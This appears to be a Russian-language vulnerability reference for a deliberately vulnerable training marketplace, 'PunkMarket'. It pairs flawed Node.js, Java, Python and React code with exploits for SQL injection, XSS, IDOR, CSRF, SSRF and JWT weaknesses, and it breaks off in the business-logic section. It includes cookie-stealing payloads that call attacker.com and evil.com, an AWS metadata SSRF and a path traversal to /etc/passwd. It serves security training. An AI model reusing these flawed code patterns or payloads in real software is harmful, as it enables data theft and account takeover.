# 🎯 PunkMarket — Полная карта уязвимостей
## Детальный справочник всех 100+ уязвимостей

---

## 📋 Оглавление

- [SQL Injection (7 мест)](#sql-injection)
- [Cross-Site Scripting (10 мест)](#cross-site-scripting)
- [IDOR (8 мест)](#idor)
- [CSRF (5 мест)](#csrf)
- [SSRF (6 мест)](#ssrf)
- [Authentication/Authorization (7 мест)](#authentication-authorization)
- [Business Logic (10 мест)](#business-logic)
- [File Upload (5 мест)](#file-upload)
- [XXE (3 места)](#xxe)
- [Deserialization (3 места)](#deserialization)
- [SSTI (2 места)](#ssti)
- [NoSQL Injection (4 места)](#nosql-injection)
- [GraphQL (4 места)](#graphql)
- [Race Conditions (4 места)](#race-conditions)
- [Advanced (10+ мест)](#advanced)

---

## SQL Injection

### SQLi-01: Products Search (Union-based) 🟢 Easy

**Локация:** `/api/v1/products/search?q=`

**Сервис:** Products Service (Node.js)

**Код (X-Ray):**
```javascript
// Author: Alex K. (Backend Team)
// Last modified: 2023-05-12

app.get('/api/v1/products/search', (req, res) => {
  const query = req.query.q;
  
  // Search products by name
  const sql = `SELECT * FROM products 
               WHERE name LIKE '%${query}%' 
               OR description LIKE '%${query}%'`;
  
  db.query(sql, (err, results) => {
    if (err) return res.status(500).json({error: 'Database error'});
    res.json(results);
  });
});
```

**Проблема:**
- Прямая конкатенация пользовательского ввода
- Нет параметризации
- Возможен UNION-based SQLi

**Exploit:**
```
GET /api/v1/products/search?q=' UNION SELECT 1,username,password,4,5 FROM users--
```

**Impact:** Critical — утечка всех пользователей и паролей

**Фикс:**
```javascript
const sql = `SELECT * FROM products 
             WHERE name LIKE ? OR description LIKE ?`;
db.query(sql, [`%${query}%`, `%${query}%`], callback);
```

---

### SQLi-02: Login Form (Error-based) 🟢 Easy

**Локация:** `POST /api/v3/auth/login`

**Сервис:** Users Service (Node.js)

**Код:**
```javascript
// Author: Maria S. (Auth Team)
// Last modified: 2022-11-20

app.post('/api/v3/auth/login', (req, res) => {
  const {username, password} = req.body;
  
  const sql = `SELECT * FROM users 
               WHERE username = '${username}' 
               AND password = '${password}'`;
  
  db.query(sql, (err, results) => {
    if (err) {
      // DEBUG mode — show full error
      return res.status(500).json({
        error: err.message,
        sql: sql  // FIXME: Remove in production
      });
    }
    
    if (results.length > 0) {
      const token = jwt.sign({id: results[0].id}, SECRET);
      res.json({token, user: results[0]});
    } else {
      res.status(401).json({error: 'Invalid credentials'});
    }
  });
});
```

**Проблема:**
- Raw SQL конкатенация
- Error messages с полным SQL
- Password stored in plaintext (!)

**Exploit:**
```json
POST /api/v3/auth/login
{
  "username": "admin' OR '1'='1",
  "password": "anything"
}
```

**Impact:** Critical — authentication bypass

---

### SQLi-03: User Reviews Filter (Boolean Blind) 🟡 Medium

**Локация:** `/api/v1/reviews/user/:userId?sort=`

**Сервис:** Reviews Service (Java)

**Код:**
```java
// Author: Peter V. (Legacy Team)
// Last modified: 2021-08-15

@GetMapping("/api/v1/reviews/user/{userId}")
public List<Review> getUserReviews(
    @PathVariable Long userId,
    @RequestParam(required = false) String sort
) {
    String sql = "SELECT * FROM reviews WHERE user_id = " + userId;
    
    if (sort != null && !sort.isEmpty()) {
        // Simple sorting support
        sql += " ORDER BY " + sort;
    }
    
    return jdbcTemplate.query(sql, new ReviewRowMapper());
}
```

**Проблема:**
- `sort` parameter не валидируется
- Boolean blind SQLi возможен
- Нет whitelist для column names

**Exploit:**
```
GET /api/v1/reviews/user/123?sort=rating DESC, (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') > 0 THEN rating ELSE id END)
```

**Impact:** High — извлечение данных через boolean blind

---

### SQLi-04: Orders Filter (Time-based Blind) 🟡 Medium

**Локация:** `/api/v2/orders/user/:userId?status=`

**Сервис:** Orders Service (Python FastAPI)

**Код:**
```python
# Author: Ivan D. (Orders Team)
# Last modified: 2023-02-10

@app.get("/api/v2/orders/user/{user_id}")
async def get_user_orders(
    user_id: int,
    status: str = None,
    db: Session = Depends(get_db)
):
    query = f"SELECT * FROM orders WHERE user_id = {user_id}"
    
    if status:
        # Filter by status
        query += f" AND status = '{status}'"
    
    result = db.execute(text(query))
    return result.fetchall()
```

**Проблема:**
- f-string с пользовательским вводом
- Time-based blind SQLi
- Нет ORM защиты

**Exploit:**
```
GET /api/v2/orders/user/1?status=' OR SLEEP(5)--
```

**Impact:** High — data exfiltration via timing

---

### SQLi-05: Admin Users Sort (Second-order) 🔴 Hard

**Локация:** `/api/v2/admin/users?sort=username`

**Сервис:** Admin Service (Node.js)

**Код:**
```javascript
// Author: Sarah L. (Admin Panel Team)
// Last modified: 2023-09-01

app.get('/api/v2/admin/users', requireAdmin, (req, res) => {
  let sortColumn = req.query.sort || 'id';
  
  // Save user preference
  db.query(
    `UPDATE admin_preferences SET sort_column = '${sortColumn}' 
     WHERE admin_id = ${req.user.id}`
  );
  
  // Then use it in next query
  db.query(
    `SELECT id, username, email, role FROM users ORDER BY ${sortColumn}`,
    (err, results) => {
      if (err) return res.status(500).json({error: 'Error'});
      res.json(results);
    }
  );
});
```

**Проблема:**
- Second-order SQLi через preferences
- Сначала сохраняется, потом используется
- Delayed exploitation

**Exploit:**
```
1. GET /api/v2/admin/users?sort=username; DROP TABLE users--
2. (SQL injected into preferences)
3. Next request triggers the malicious SQL
```

**Impact:** Critical — возможен DROP TABLE

---

### SQLi-06: Product Analytics (Stacked Queries) 🔴 Hard

**Локация:** `/api/v1/products/:id/analytics`

**Сервис:** Products Service (Node.js + PostgreSQL)

**Код:**
```javascript
// Author: Tom H. (Analytics Team)
// Last modified: 2023-07-20

app.get('/api/v1/products/:id/analytics', async (req, res) => {
  const productId = req.params.id;
  const period = req.query.period || '30d';
  
  // Raw query for complex analytics
  const sql = `
    SELECT 
      DATE(created_at) as date,
      COUNT(*) as views,
      SUM(CASE WHEN action='purchase' THEN 1 ELSE 0 END) as purchases
    FROM analytics
    WHERE product_id = ${productId}
    AND created_at > NOW() - INTERVAL '${period}'
    GROUP BY DATE(created_at)
  `;
  
  const result = await db.raw(sql);
  res.json(result.rows);
});
```

**Проблема:**
- PostgreSQL позволяет stacked queries
- `period` parameter injectable
- Можно выполнить несколько запросов

**Exploit:**
```
GET /api/v1/products/1/analytics?period=1d'; CREATE TABLE pwned AS SELECT * FROM users; --
```

**Impact:** Critical — arbitrary SQL execution

---

### SQLi-07: JSON Field Injection (PostgreSQL JSONB) 🔴 Expert

**Локация:** `/api/v3/users/me` (PUT with JSON filter)

**Сервис:** Users Service (Node.js + PostgreSQL)

**Код:**
```javascript
// Author: Alex K. (API Team)
// Last modified: 2024-01-15

app.put('/api/v3/users/me', authenticate, async (req, res) => {
  const {settings} = req.body;
  const userId = req.user.id;
  
  // Update user settings (JSONB field)
  const keys = Object.keys(settings);
  const updates = keys.map(key => 
    `settings->>'${key}' = '${settings[key]}'`
  ).join(', ');
  
  const sql = `UPDATE users 
               SET ${updates}
               WHERE id = ${userId}`;
  
  await db.query(sql);
  res.json({success: true});
});
```

**Проблема:**
- JSONB operator `->>`
- Dynamic key construction
- SQL injection через JSON keys

**Exploit:**
```json
PUT /api/v3/users/me
{
  "settings": {
    "theme' = 'dark' WHERE id = 1; UPDATE users SET role = 'admin' WHERE id = 2; --": "value"
  }
}
```

**Impact:** Critical — privilege escalation

---

## Cross-Site Scripting

### XSS-01: Search Results (Reflected) 🟢 Easy

**Локация:** `/search?q=<script>alert(1)</script>`

**Component:** Search Page (React)

**Код:**
```jsx
// src/pages/search.tsx
// Author: Lisa M. (Frontend Team)
// Last modified: 2023-03-10

export default function SearchPage() {
  const router = useRouter();
  const query = router.query.q as string;
  
  return (
    <div>
      <h1>Search results for: {query}</h1>
      <div dangerouslySetInnerHTML={{__html: query}} />
      {/* TODO: Use proper escaping */}
    </div>
  );
}
```

**Проблема:**
- `dangerouslySetInnerHTML` с user input
- Нет sanitization
- Reflected XSS

**Exploit:**
```
https://punkmarket.com/search?q=<img src=x onerror=alert(document.cookie)>
```

**Impact:** High — session hijacking

---

### XSS-02: Product Reviews (Stored) 🟢 Easy

**Локация:** `/api/v1/products/:id/reviews` (POST)

**Backend:** Reviews Service

**Код:**
```javascript
// Author: Mike T. (Reviews Team)
// Last modified: 2022-12-05

app.post('/api/v1/products/:id/reviews', authenticate, (req, res) => {
  const {rating, text} = req.body;
  const productId = req.params.id;
  const userId = req.user.id;
  
  // Simple validation
  if (!rating || !text) {
    return res.status(400).json({error: 'Missing fields'});
  }
  
  if (text.length > 1000) {
    return res.status(400).json({error: 'Text too long'});
  }
  
  db.query(
    `INSERT INTO reviews (product_id, user_id, rating, text) 
     VALUES (?, ?, ?, ?)`,
    [productId, userId, rating, text]
  );
  
  res.json({success: true});
});
```

**Frontend (display):**
```jsx
{reviews.map(review => (
  <div key={review.id}>
    <div dangerouslySetInnerHTML={{__html: review.text}} />
  </div>
))}
```

**Проблема:**
- Backend не sanitize
- Frontend использует `dangerouslySetInnerHTML`
- Stored XSS

**Exploit:**
```json
POST /api/v1/products/123/reviews
{
  "rating": 5,
  "text": "<img src=x onerror='fetch(`https://attacker.com/?cookie=${document.cookie}`)'>"
}
```

**Impact:** Critical — affects all visitors

---

### XSS-03: User Profile Bio (Stored) 🟢 Easy

**Локация:** `/api/v3/users/me` (PUT)

**Код:**
```javascript
// Author: Sarah L. (Profile Team)
// Last modified: 2023-06-18

app.put('/api/v3/users/me', authenticate, async (req, res) => {
  const {bio, location} = req.body;
  
  await db.query(
    `UPDATE users SET bio = ?, location = ? WHERE id = ?`,
    [bio, location, req.user.id]
  );
  
  res.json({success: true});
});
```

**Frontend:**
```tsx
<div className="bio">
  <div dangerouslySetInnerHTML={{__html: user.bio}} />
</div>
```

**Exploit:**
```json
PUT /api/v3/users/me
{
  "bio": "<svg/onload=alert(document.domain)>",
  "location": "Moscow"
}
```

---

### XSS-04: Sort Parameter (Reflected, HTML Attr) 🟡 Medium

**Локация:** `/reviews?sort=<script>`

**Код:**
```jsx
// src/pages/reviews.tsx

export default function ReviewsPage() {
  const router = useRouter();
  const sort = router.query.sort || 'recent';
  
  return (
    <div>
      <select value={sort}>
        <option value="recent">Recent</option>
        <option value="rating">Rating</option>
      </select>
      
      {/* Vulnerable: sort reflected in attribute */}
      <input type="hidden" name="sort" value={sort} />
    </div>
  );
}
```

**Проблема:**
- Reflected в HTML attribute
- Можно выйти из context

**Exploit:**
```
/reviews?sort=" onload="alert(1)
```

**Impact:** High

---

### XSS-05: Product Name in Cart (Stored, JS Context) 🟡 Medium

**Локация:** Shopping Cart JS

**Код:**
```jsx
// src/components/Cart/CartItem.tsx

export default function CartItem({item}) {
  useEffect(() => {
    // Google Analytics tracking
    window.gtag('event', 'add_to_cart', {
      item_name: item.name,
      item_id: item.id
    });
  }, []);
  
  return <div>{item.name}</div>;
}
```

**Admin может создать продукт:**
```json
POST /api/v2/admin/products
{
  "name": "Laptop\"; fetch('https://evil.com/?c='+document.cookie); var x=\"",
  "price": 1000
}
```

**Результат:**
```javascript
window.gtag('event', 'add_to_cart', {
  item_name: "Laptop"; fetch('https://evil.com/?c='+document.cookie); var x="",
  item_id: 123
});
```

**Impact:** High — JS context escape

---

### XSS-06: Error Message (Reflected, JS String) 🟡 Medium

**Локация:** `/api/v1/products/:id` (invalid ID)

**Код:**
```javascript
app.get('/api/v1/products/:id', (req, res) => {
  const id = req.params.id;
  
  db.query('SELECT * FROM products WHERE id = ?', [id], (err, results) => {
    if (err) {
      return res.status(500).json({
        error: `Database error while fetching product ${id}`
      });
    }
    
    if (results.length === 0) {
      return res.status(404).json({
        error: `Product not found: ${id}`
      });
    }
    
    res.json(results[0]);
  });
});
```

**Frontend:**
```jsx
.catch(err => {
  alert(`Error: ${err.message}`);
});
```

**Exploit:**
```
GET /api/v1/products/123'; alert(1); //
```

**Impact:** Medium

---

### XSS-07: Category Filter (DOM-based) 🟡 Medium

**Локация:** `/catalog` with `#category=<payload>`

**Код:**
```jsx
// src/pages/catalog.tsx

export default function CatalogPage() {
  useEffect(() => {
    // Read category from hash
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(hash);
    const category = params.get('category');
    
    if (category) {
      // Update UI
      document.getElementById('category-name').innerHTML = category;
    }
  }, []);
  
  return (
    <div>
      <h1>Category: <span id="category-name"></span></h1>
    </div>
  );
}
```

**Exploit:**
```
/catalog#category=<img src=x onerror=alert(1)>
```

**Impact:** High — DOM XSS

---

### XSS-08: Search Autocomplete (DOM-based, React) 🔴 Hard

**Локация:** Search autocomplete component

**Код:**
```tsx
// src/components/Search/Autocomplete.tsx

export default function Autocomplete() {
  const [suggestions, setSuggestions] = useState([]);
  
  const handleInput = (e) => {
    const query = e.target.value;
    
    fetch(`/api/v1/search/suggest?q=${query}`)
      .then(r => r.json())
      .then(data => {
        // DANGEROUS: trusting API response
        setSuggestions(data.map(item => ({
          ...item,
          highlighted: item.name.replace(
            query,
            `<b>${query}</b>`  // NO ESCAPING!
          )
        })));
      });
  };
  
  return (
    <div>
      {suggestions.map(s => (
        <div dangerouslySetInnerHTML={{__html: s.highlighted}} />
      ))}
    </div>
  );
}
```

**Exploit:**
- Attacker контролирует API response (через MITM или compromised backend)
- Injection в `highlighted` field

**Impact:** Critical — bypasses CSP via DOM

---

### XSS-09: Admin Logs Viewer (Stored, CSP Bypass) 🔴 Hard

**Локация:** `/admin/logs`

**Код:**
```jsx
// src/pages/admin/logs.tsx

export default function LogsPage() {
  const [logs, setLogs] = useState([]);
  
  useEffect(() => {
    fetch('/api/v2/admin/logs')
      .then(r => r.json())
      .then(data => setLogs(data));
  }, []);
  
  return (
    <div>
      <table>
        {logs.map(log => (
          <tr key={log.id}>
            <td>{log.timestamp}</td>
            <td>
              {/* Log message может содержать HTML */}
              <div dangerouslySetInnerHTML={{__html: log.message}} />
            </td>
          </tr>
        ))}
      </table>
    </div>
  );
}
```

**CSP:**
```
Content-Security-Policy: script-src 'self' https://cdn.example.com
```

**Exploit:**
- Attacker вызывает ошибку с payload в User-Agent
- Payload попадает в logs
- Admin видит log → XSS с CSP bypass через `<link rel="prefetch">`

**Impact:** Critical

---

### XSS-10: GraphQL Error (Reflected, JSON Context) 🔴 Expert

**Локация:** `/graphql` query errors

**Код:**
```javascript
// GraphQL resolver
const resolvers = {
  Query: {
    product: (_, {id}) => {
      if (!id.match(/^\d+$/)) {
        throw new Error(`Invalid product ID: ${id}`);
      }
      return db.getProduct(id);
    }
  }
};
```

**Frontend:**
```jsx
.catch(err => {
  console.log(err.message);
  showNotification(err.message);  // Displayed in UI
});
```

**Exploit:**
```graphql
query {
  product(id: "123<img src=x onerror=alert(1)>") {
    name
  }
}
```

**Impact:** High — JSON context XSS

---

## IDOR

### IDOR-01: View Order Details 🟢 Easy

**Локация:** `GET /api/v2/orders/:id`

**Код:**
```javascript
app.get('/api/v2/orders/:id', authenticate, async (req, res) => {
  const orderId = req.params.id;
  
  // Missing: check if order belongs to req.user
  const order = await db.query(
    'SELECT * FROM orders WHERE id = ?',
    [orderId]
  );
  
  if (!order) {
    return res.status(404).json({error: 'Order not found'});
  }
  
  res.json(order);
});
```

**Exploit:**
```
GET /api/v2/orders/12345
Authorization: Bearer <your_token>
```

**Impact:** High — view any order

---

### IDOR-02: View User Profile 🟢 Easy

**Локация:** `GET /api/v3/users/:id`

**Код:**
```javascript
app.get('/api/v3/users/:id', authenticate, async (req, res) => {
  const userId = req.params.id;
  
  const user = await db.query(
    `SELECT id, username, email, phone, address, bio 
     FROM users WHERE id = ?`,
    [userId]
  );
  
  if (!user) {
    return res.status(404).json({error: 'User not found'});
  }
  
  res.json(user);
});
```

**Impact:** High — PII leak

---

### IDOR-03: Edit Review 🟢 Easy

**Локация:** `PUT /api/v1/reviews/:id`

**Код:**
```javascript
app.put('/api/v1/reviews/:id', authenticate, async (req, res) => {
  const {text, rating} = req.body;
  const reviewId = req.params.id;
  
  // NO ownership check!
  await db.query(
    'UPDATE reviews SET text = ?, rating = ? WHERE id = ?',
    [text, rating, reviewId]
  );
  
  res.json({success: true});
});
```

**Exploit:**
- Изменить чужие отзывы

---

### IDOR-04: Draft Products Access 🟡 Medium

**Локация:** `GET /api/v1/products/:id?include_draft=true`

**Код:**
```javascript
app.get('/api/v1/products/:id', async (req, res) => {
  const {id} = req.params;
  const {include_draft} = req.query;
  
  let sql = 'SELECT * FROM products WHERE id = ?';
  
  // Only show published products by default
  if (!include_draft) {
    sql += ' AND status = "published"';
  }
  
  // Missing: role check for drafts!
  const product = await db.query(sql, [id]);
  res.json(product);
});
```

**Exploit:**
```
GET /api/v1/products/999?include_draft=true
```

**Impact:** Medium — leak unreleased products

---

### IDOR-05: Download Invoice (UUID) 🟡 Medium

**Локация:** `GET /api/v2/orders/:id/invoice.pdf`

**Код:**
```javascript
app.get('/api/v2/orders/:orderId/invoice.pdf', authenticate, async (req, res) => {
  const orderId = req.params.orderId;
  
  const order = await db.query(
    'SELECT * FROM orders WHERE id = ?',
    [orderId]
  );
  
  if (!order) {
    return res.status(404).send('Order not found');
  }
  
  // Generate PDF path using predictable UUID v1
  const pdfPath = `/invoices/${order.uuid}.pdf`;
  res.download(pdfPath);
});
```

**Проблема:**
- UUID v1 predictable (timestamp-based)
- No ownership check

**Exploit:**
- Enumerate UUIDs

---

### IDOR-06: User Address (Race Condition Bypass) 🔴 Hard

**Локация:** `DELETE /api/v3/users/me/addresses/:id`

**Код:**
```javascript
app.delete('/api/v3/users/me/addresses/:id', authenticate, async (req, res) => {
  const addressId = req.params.id;
  const userId = req.user.id;
  
  // Check ownership
  const address = await db.query(
    'SELECT * FROM addresses WHERE id = ? AND user_id = ?',
    [addressId, userId]
  );
  
  if (!address) {
    return res.status(403).json({error: 'Forbidden'});
  }
  
  // Race condition window here!
  await sleep(100); // Simulated delay
  
  // Delete without re-checking
  await db.query('DELETE FROM addresses WHERE id = ?', [addressId]);
  res.json({success: true});
});
```

**Exploit:**
- Race condition: send 2 simultaneous requests
- Transfer address ownership between requests

---

### IDOR-07: Admin Logs Path Traversal 🔴 Hard

**Локация:** `GET /api/v2/admin/logs?file=`

**Код:**
```javascript
app.get('/api/v2/admin/logs', requireAdmin, async (req, res) => {
  const filename = req.query.file || 'app.log';
  
  // VULNERABLE: no path sanitization
  const logPath = `/var/logs/${filename}`;
  
  if (!fs.existsSync(logPath)) {
    return res.status(404).json({error: 'Log file not found'});
  }
  
  const content = fs.readFileSync(logPath, 'utf8');
  res.json({filename, content});
});
```

**Exploit:**
```
GET /api/v2/admin/logs?file=../../../../etc/passwd
```

**Impact:** Critical — LFI

---

### IDOR-08: GraphQL Batching 🔴 Expert

**Локация:** GraphQL `/graphql`

**Schema:**
```graphql
type Query {
  order(id: ID!): Order
}
```

**Resolver:**
```javascript
const resolvers = {
  Query: {
    order: async (_, {id}, context) => {
      // Missing auth check
      return db.getOrder(id);
    }
  }
};
```

**Exploit (batching):**
```graphql
query {
  o1: order(id: "1") { total }
  o2: order(id: "2") { total }
  o3: order(id: "3") { total }
  # ... repeat 100 times
  o100: order(id: "100") { total }
}
```

**Impact:** Critical — массовая утечка

---

## CSRF

### CSRF-01: Update Profile 🟢 Easy

**Локация:** `POST /api/v3/users/me`

**Код:**
```javascript
app.post('/api/v3/users/me', authenticate, async (req, res) => {
  const {email, bio} = req.body;
  
  // NO CSRF token check!
  await db.query(
    'UPDATE users SET email = ?, bio = ? WHERE id = ?',
    [email, bio, req.user.id]
  );
  
  res.json({success: true});
});
```

**Exploit:**
```html
<form action="https://punkmarket.com/api/v3/users/me" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

---

### CSRF-02: Add Review 🟢 Easy

**Локация:** `POST /api/v1/reviews`

**Exploit:** Same as CSRF-01

---

### CSRF-03: Cancel Order (Referer Bypass) 🟡 Medium

**Локация:** `DELETE /api/v2/orders/:id`

**Код:**
```javascript
app.delete('/api/v2/orders/:id', authenticate, (req, res) => {
  // Weak CSRF protection
  const referer = req.get('Referer');
  
  if (!referer || !referer.startsWith('https://punkmarket.com')) {
    return res.status(403).json({error: 'Invalid referer'});
  }
  
  // Cancel order logic
  db.query('UPDATE orders SET status = "cancelled" WHERE id = ?', [req.params.id]);
  res.json({success: true});
});
```

**Bypass:**
```html
<iframe src="https://punkmarket.com/orders/123"></iframe>
<script>
setTimeout(() => {
  fetch('https://punkmarket.com/api/v2/orders/123', {
    method: 'DELETE',
    credentials: 'include'
  });
}, 1000);
</script>
```

---

### CSRF-04: Change Email (SameSite=None) 🔴 Hard

**Локация:** `PUT /api/v3/users/me/email`

**Cookie:**
```
Set-Cookie: session=abc123; SameSite=None; Secure
```

**Код:**
```javascript
app.put('/api/v3/users/me/email', authenticate, async (req, res) => {
  const {email} = req.body;
  
  // Change email without verification
  await db.query('UPDATE users SET email = ? WHERE id = ?', [email, req.user.id]);
  res.json({success: true});
});
```

**Exploit:**
- CSRF works потому что SameSite=None
- Account takeover via email change

---

### CSRF-05: Grant Admin (JSON Request) 🔴 Expert

**Локация:** `POST /api/v2/admin/users/:id/role`

**Код:**
```javascript
app.post('/api/v2/admin/users/:userId/role', requireAdmin, async (req, res) => {
  const {role} = req.body;
  const userId = req.params.userId;
  
  // JSON endpoint, but still vulnerable
  await db.query('UPDATE users SET role = ? WHERE id = ?', [role, userId]);
  res.json({success: true});
});
```

**Exploit:**
```html
<form id="csrf" method="POST" action="https://punkmarket.com/api/v2/admin/users/123/role" enctype="text/plain">
  <input name='{"role":"admin", "x":"' value='y"}'>
</form>
<script>document.getElementById('csrf').submit();</script>
```

**Результат:**
```
Content-Type: text/plain
{"role":"admin", "x":"=y"}
```

**Backend парсит это как JSON (некоторые фреймворки)**

---

## SSRF

### SSRF-01: Avatar URL Fetch 🟢 Easy

**Локация:** `POST /api/v3/users/me` (avatarUrl field)

**Код:**
```javascript
app.post('/api/v3/users/me', authenticate, async (req, res) => {
  const {avatarUrl} = req.body;
  
  if (avatarUrl) {
    // Fetch and save avatar
    const response = await fetch(avatarUrl);
    const buffer = await response.buffer();
    fs.writeFileSync(`/uploads/${req.user.id}.jpg`, buffer);
  }
  
  await db.query('UPDATE users SET avatar_url = ? WHERE id = ?', [avatarUrl, req.user.id]);
  res.json({success: true});
});
```

**Exploit:**
```json
POST /api/v3/users/me
{
  "avatarUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**Impact:** Critical — AWS metadata access

---

### SSRF-02: Product Import URL 🟡 Medium

**Локация:** `POST /api/v1/products/import`

**Код:**
```javascript
app.post('/api/v1/products/import', requireAdmin, async (req, res) => {
  const {url} = req.body;
  
  // Basic filter
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    return res.status(400).json({error: 'Invalid URL'});
  }
  
  const response = await fetch(url);
  const data = await response.json();
  
  // Import products from JSON
  for (const product of data.products) {
    await db.query('INSERT INTO products (...) VALUES (...)', [...]);
  }
  
  res.json({success: true});
});
```

**Bypass:**
```
https://evil.com@169.254.169.254/
```

---

### SSRF-03: Advanced Search Webhook 🟡 Medium

**Локация:** `POST /api/v1/search/advanced`

**Код:**
```javascript
app.post('/api/v1/search/advanced', authenticate, async (req, res) => {
  const {query, webhookUrl} = req.body;
  
  // Search products
  const results = await searchProducts(query);
  
  // Call webhook with results
  if (webhookUrl) {
    // Block localhost
    const url = new URL(webhookUrl);
    if (url.hostname === 'localhost' || url.hostname === '127.0.0.1') {
      return res.status(400).json({error: 'Localhost not allowed'});
    }
    
    await fetch(webhookUrl, {
      method: 'POST',
      body: JSON.stringify(results)
    });
  }
  
  res.json(results);
});
```

**Bypass:**
```
http://127.1/   (decimal IP)
http://0x7f.1/  (hex IP)
http://[::1]/   (IPv6)
```

---

### SSRF-04: Order Webhook (DNS Rebinding) 🔴 Hard

**Код:**
```javascript
app.post('/api/v2/orders/webhooks', requireAdmin, async (req, res) => {
  const {callbackUrl} = req.body;
  
  // Check URL first
  const initialCheck = await dns.resolve(new URL(callbackUrl).hostname);
  if (initialCheck.includes('127.0.0.1') || initialCheck.includes('169.254.169.254')) {
    return res.status(400).json({error: 'Forbidden IP'});
  }
  
  // Wait a bit (simulated processing)
  await sleep(5000);
  
  // Call webhook (DNS может измениться!)
  await fetch(callbackUrl);
  res.json({success: true});
});
```

**Exploit:**
- DNS rebinding attack
- evil.com → 1.2.3.4 (first lookup)
- evil.com → 127.0.0.1 (second lookup after TTL)

---

### SSRF-05: GraphQL Price Fetcher (Chaining) 🔴 Hard

**Schema:**
```graphql
type Query {
  fetchPrice(url: String!): Float
}
```

**Resolver:**
```javascript
fetchPrice: async (_, {url}) => {
  // Fetch external price API
  const response = await fetch(url);
  const data = await response.json();
  return data.price;
}
```

**Exploit (Chain):**
1. SSRF to internal admin API
2. Get admin token
3. Use token in GraphQL mutation
4. Privilege escalation

---

### SSRF-06: PDF Generator (HTML → SSRF → RCE) 🔴 Expert

**Локация:** `POST /api/v2/orders/:id/invoice/generate`

**Код:**
```javascript
const puppeteer = require('puppeteer');

app.post('/api/v2/orders/:id/invoice/generate', authenticate, async (req, res) => {
  const orderId = req.params.id;
  const order = await db.getOrder(orderId);
  
  // Generate HTML invoice
  const html = `
    <html>
      <body>
        <h1>Invoice #${order.id}</h1>
        <img src="${order.logoUrl}">
        <p>Total: $${order.total}</p>
      </body>
    </html>
  `;
  
  // Convert to PDF
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.setContent(html);
  const pdf = await page.pdf();
  
  res.contentType('application/pdf');
  res.send(pdf);
});
```

**Exploit:**
```json
POST /api/v2/orders (create order with malicious logoUrl)
{
  "items": [...],
  "logoUrl": "file:///etc/passwd"
}
```

**Then generate PDF:**
```
POST /api/v2/orders/123/invoice/generate
```

**Chain to RCE:**
- SSRF to internal service
- Use Chrome DevTools Protocol
- Achieve RCE

---

## Authentication/Authorization

### AUTH-01: JWT alg=none 🟢 Easy

**Локация:** JWT token verification

**Код:**
```javascript
const jwt = require('jsonwebtoken');

function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({error: 'No token'});
  }
  
  try {
    // VULNERABLE: accepts alg=none
    const decoded = jwt.verify(token, SECRET, {
      algorithms: ['HS256', 'none']  // OOPS!
    });
    
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({error: 'Invalid token'});
  }
}
```

**Exploit:**
```javascript
// Create token with alg=none
const header = btoa(JSON.stringify({alg: 'none', typ: 'JWT'}));
const payload = btoa(JSON.stringify({id: 1, role: 'admin'}));
const token = `${header}.${payload}.`;  // No signature!
```

---

### AUTH-02: Session Fixation 🟢 Easy

**Код:**
```javascript
app.post('/api/v3/auth/login', async (req, res) => {
  const {username, password} = req.body;
  
  const user = await db.findUser(username, password);
  if (!user) {
    return res.status(401).json({error: 'Invalid credentials'});
  }
  
  // VULNERABLE: reuse existing session ID
  // Should regenerate session on login!
  req.session.userId = user.id;
  req.session.role = user.role;
  
  res.json({success: true, user});
});
```

**Exploit:**
1. Attacker получает session ID
2. Отправляет жертве link с session ID
3. Жертва логинится
4. Attacker получает доступ

---

### AUTH-03: Predictable Password Reset Token 🟡 Medium

**Код:**
```javascript
app.post('/api/v3/auth/forgot-password', async (req, res) => {
  const {email} = req.body;
  
  const user = await db.findUserByEmail(email);
  if (!user) {
    return res.json({message: 'If user exists, email sent'});
  }
  
  // VULNERABLE: predictable token
  const token = user.id + '_' + Date.now();
  
  await db.query(
    'UPDATE users SET reset_token = ?, reset_expires = ? WHERE id = ?',
    [token, Date.now() + 3600000, user.id]
  );
  
  sendEmail(email, `Reset link: /reset-password?token=${token}`);
  res.json({message: 'If user exists, email sent'});
});
```

**Exploit:**
- Enumerate user IDs
- Predict timestamp
- Brute-force token

---

### AUTH-04: OAuth Open Redirect 🟡 Medium

**Код:**
```javascript
app.get('/api/v3/auth/oauth/callback', async (req, res) => {
  const {code, redirect_uri} = req.query;
  
  // Exchange code for token
  const token = await exchangeCodeForToken(code);
  
  // VULNERABLE: no validation of redirect_uri
  res.redirect(redirect_uri + '?token=' + token);
});
```

**Exploit:**
```
/api/v3/auth/oauth/callback?code=abc&redirect_uri=https://evil.com/steal
```

**Impact:** Token leak

---

### AUTH-05: JWT Weak Secret 🔴 Hard

**Код:**
```javascript
const SECRET = 'secret123';  // Weak secret!

function generateToken(user) {
  return jwt.sign({id: user.id, role: user.role}, SECRET);
}
```

**Exploit:**
```bash
# Brute-force JWT secret
john --wordlist=rockyou.txt jwt.txt
hashcat -m 16500 jwt.txt wordlist.txt
```

**Impact:** Full auth bypass

---

### AUTH-06: Race Condition in Multi-Factor Auth 🔴 Hard

**Код:**
```javascript
app.post('/api/v3/auth/verify-2fa', async (req, res) => {
  const {userId, code} = req.body;
  
  const user = await db.findUser(userId);
  
  // Check if code is correct
  if (user.totp_code !== code) {
    return res.status(401).json({error: 'Invalid code'});
  }
  
  // Race condition window here
  await sleep(100);
  
  // Mark as verified
  await db.query('UPDATE users SET totp_verified = 1 WHERE id = ?', [userId]);
  
  const token = generateToken(user);
  res.json({token});
});
```

**Exploit:**
- Send multiple requests with wrong codes
- One will pass during race window

---

### AUTH-07: GraphQL Introspection Leak 🔴 Expert

**Schema:**
```graphql
type Query {
  adminUsers: [User] @auth(requires: ADMIN)
  adminLogs: [Log] @auth(requires: ADMIN)
}
```

**Problem:**
- Introspection enabled
- Admin queries visible to all

**Exploit:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**Impact:** Schema leak + potential bypass

---

## Business Logic

### BL-01: Infinite Promo Code Reuse 🟢 Easy

**Код:**
```javascript
app.post('/api/v2/orders/apply-promo', authenticate, async (req, res) => {
  const {code} = req.body;
  
